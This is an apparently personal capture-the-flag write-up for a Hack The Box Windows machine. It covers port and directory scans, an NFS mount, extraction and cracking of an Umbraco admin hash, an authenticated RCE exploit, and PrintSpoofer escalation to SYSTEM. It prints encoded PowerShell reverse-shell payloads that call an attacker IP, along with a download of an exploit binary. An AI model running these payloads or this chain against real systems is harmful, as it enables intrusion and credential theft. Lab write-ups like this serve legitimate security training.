## IP/Name
### Initial access
Port scan
```bash
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
111/tcp  open  rpcbind?
| rpcinfo: 
|   program version    port/proto  service
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  4           2049/tcp   nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
2049/tcp open  nlockmgr      1-4 (RPC #100021)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: 58m36s
| smb2-time: 
|   date: 2026-09-20T16:44:56
|_  start_date: N/A

```

dirscan
```
┌──(kali㉿kali)-[~/HTB/Remote]
└─$ ffuf -u http://$target/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -recursion -recursion-depth 1 -o dirs            

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.230.172/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
 :: Output file      : dirs
 :: File format      : json
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

contact                 [Status: 200, Size: 7880, Words: 828, Lines: 125, Duration: 150ms]
install                 [Status: 302, Size: 126, Words: 6, Lines: 4, Duration: 313ms]
blog                    [Status: 200, Size: 5001, Words: 1249, Lines: 138, Duration: 966ms]
home                    [Status: 200, Size: 6703, Words: 1807, Lines: 188, Duration: 628ms]
products                [Status: 200, Size: 5338, Words: 1307, Lines: 130, Duration: 106ms]
product                 [Status: 500, Size: 3420, Words: 774, Lines: 81, Duration: 961ms]
intranet                [Status: 200, Size: 3313, Words: 683, Lines: 117, Duration: 106ms]
Install                 [Status: 302, Size: 126, Words: 6, Lines: 4, Duration: 104ms]
people                  [Status: 200, Size: 6739, Words: 2109, Lines: 168, Duration: 151ms]
Home                    [Status: 200, Size: 6703, Words: 1807, Lines: 188, Duration: 204ms]
about-us                [Status: 200, Size: 5451, Words: 1232, Lines: 162, Duration: 118ms]
umbraco                 [Status: 200, Size: 4040, Words: 710, Lines: 96, Duration: 371ms]
Products                [Status: 200, Size: 5338, Words: 1307, Lines: 130, Duration: 296ms]
Blog                    [Status: 200, Size: 5011, Words: 1249, Lines: 138, Duration: 564ms]
master                  [Status: 500, Size: 3420, Words: 774, Lines: 81, Duration: 301ms]
Product                 [Status: 500, Size: 3420, Words: 774, Lines: 81, Duration: 173ms]
Contact                 [Status: 200, Size: 7880, Words: 828, Lines: 125, Duration: 285ms]
INSTALL                 [Status: 302, Size: 126, Words: 6, Lines: 4, Duration: 555ms]
person                  [Status: 200, Size: 2741, Words: 503, Lines: 82, Duration: 3180ms]
Master                  [Status: 500, Size: 3420, Words: 774, Lines: 81, Duration: 428ms]
Intranet                [Status: 200, Size: 3313, Words: 683, Lines: 117, Duration: 289ms]
People                  [Status: 200, Size: 6739, Words: 2109, Lines: 168, Duration: 288ms]
Person                  [Status: 200, Size: 2741, Words: 503, Lines: 82, Duration: 719ms]
                       [Status: 200, Size: 6693, Words: 1807, Lines: 188, Duration: 262ms]
HOME                    [Status: 200, Size: 6703, Words: 1807, Lines: 188, Duration: 304ms]
BLOG                    [Status: 200, Size: 5001, Words: 1249, Lines: 138, Duration: 308ms]
About-Us                [Status: 200, Size: 5441, Words: 1232, Lines: 162, Duration: 384ms]
1111                    [Status: 200, Size: 4196, Words: 911, Lines: 124, Duration: 159ms]
CONTACT                 [Status: 200, Size: 7880, Words: 828, Lines: 125, Duration: 276ms]
INTRANET                [Status: 200, Size: 3313, Words: 683, Lines: 117, Duration: 257ms]
PRODUCTS                [Status: 200, Size: 5328, Words: 1307, Lines: 130, Duration: 187ms]
PRODUCT                 [Status: 500, Size: 3420, Words: 774, Lines: 81, Duration: 225ms]
1116                    [Status: 200, Size: 6739, Words: 2109, Lines: 168, Duration: 372ms]
1118                    [Status: 200, Size: 2752, Words: 506, Lines: 82, Duration: 323ms]
1117                    [Status: 200, Size: 2750, Words: 506, Lines: 82, Duration: 325ms]
1148                    [Status: 200, Size: 3313, Words: 683, Lines: 117, Duration: 327ms]
1121                    [Status: 200, Size: 2750, Words: 506, Lines: 82, Duration: 319ms]
About-us                [Status: 200, Size: 5441, Words: 1232, Lines: 162, Duration: 464ms]
Umbraco                 [Status: 200, Size: 4040, Words: 710, Lines: 96, Duration: 494ms]
1113                    [Status: 200, Size: 4271, Words: 923, Lines: 124, Duration: 404ms]
1110                    [Status: 200, Size: 4176, Words: 907, Lines: 124, Duration: 217ms]
1124                    [Status: 200, Size: 4723, Words: 914, Lines: 152, Duration: 262ms]
1122                    [Status: 200, Size: 5441, Words: 1232, Lines: 162, Duration: 299ms]
1126                    [Status: 200, Size: 4869, Words: 1022, Lines: 131, Duration: 299ms]
1127                    [Status: 200, Size: 5813, Words: 1234, Lines: 139, Duration: 297ms]
1109                    [Status: 200, Size: 4039, Words: 887, Lines: 124, Duration: 338ms]

```

We see umbrac it have rce with authenticated so let find cred

check ftp
```
┌──(kali㉿kali)-[~/HTB/Remote]
└─$ ftp 10.129.230.172
Connected to 10.129.230.172.
220 Microsoft FTP Service
Name (10.129.230.172:kali): ftp
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||49688|)
150 Opening ASCII mode data connection.
226 Transfer complete.
ftp> dir
229 Entering Extended Passive Mode (|||49689|)
125 Data connection already open; Transfer starting.
226 Transfer complete.
ftp> 


```

Nothing

Check nfs
```bash
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/HTB/Remote]
└─$ showmount -e 10.129.230.172

Export list for 10.129.230.172:
/site_backups (everyone)
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/HTB/Remote]
└─$ sudo mkdir -p /mnt/remote_share                         
[sudo] password for kali: 
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/HTB/Remote]
└─$ sudo mount -t nfs 10.129.230.172:/site_backups /mnt/remote_share -o nolock
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/HTB/Remote]
└─$ ls /mnt/remote_share 
App_Browsers  App_Data  App_Plugins  aspnet_client  bin  Config  css  default.aspx  Global.asax  Media  scripts  Umbraco  Umbraco_Client  Views  Web.config
                                                                                                                                                                  
```
After research the database that store cred in umbraco is in `App_Data/Umbraco.sdf` and we can read the cred

```bash
App_Data/Umbraco.sdf

┌──(kali㉿kali)-[/mnt/remote_share]
└─$ grep -a -o -P '[\w\.\-]+@[\w\.\-]+\.\w{2,4}.{0,100}?[a-f0-9]{40}' App_Data/Umbraco.sdf

adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa

```

Let crack it
```bash {15}
┌──(kali㉿kali)-[~/HTB/Remote]
└─$ john  --wordlist=/usr/share/wordlists/rockyou.txt admin_hash.txt 
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-AxCrypt"
Use the "--format=Raw-SHA1-AxCrypt" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-Linkedin"
Use the "--format=Raw-SHA1-Linkedin" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "ripemd-160"
Use the "--format=ripemd-160" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "has-160"
Use the "--format=has-160" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 512/512 AVX512BW 16x])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
baconandcheese   (?)     
1g 0:00:00:00 DONE (2026-09-20 12:23) 2.941g/s 28893Kp/s 28893Kc/s 28893KC/s baconandchipies1..bacon84
Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
Session completed.
```

We have cred `admin@htb.local:baconandcheese`

Using this to get revshell https://github.com/noraj/Umbraco-RCE
```
┌──(kali㉿kali)-[~/HTB/Remote/Umbraco-RCE]
└─$ python exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.129.230.172' -c "whoami" 
iis apppool\defaultapppool

┌──(kali㉿kali)-[~/HTB/Remote/Umbraco-RCE]
└─$ python exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.129.230.172' -c powershell.exe -a "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA3AC4ANAA3ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="



```

We have revshell
```
┌──(kali㉿kali)-[~/HTB/Remote]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.17.47] from (UNKNOWN) [10.129.230.172] 49703

PS C:\windows\system32\inetsrv> 

```
Run whoami /all we see seimpersionate let run potato like attack
```powershell

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

```
### Priv escalation
```
PS C:\> mkdir tmp
PS C:\tmp> curl http://10.10.17.47/PrintSpoofer64.exe -o PrintSpoofer64.exe
PS C:\tmp> ./PrintSpoofer64.exe -c "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA3AC4ANAA3ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK

```

```
┌──(kali㉿kali)-[~/HTB/Remote]
└─$ rlwrap nc -lvnp 443                                               
listening on [any] 443 ...
connect to [10.10.17.47] from (UNKNOWN) [10.129.230.172] 49709

PS C:\Windows\system32> whoami
nt authority\system

```

Alternative
```
Get-ItemProperty -Path HKLM:\SOFTWARE\WOW6432Node\TeamViewer\Version7

```
And using cve CVE-2019-18988 in team view to crack it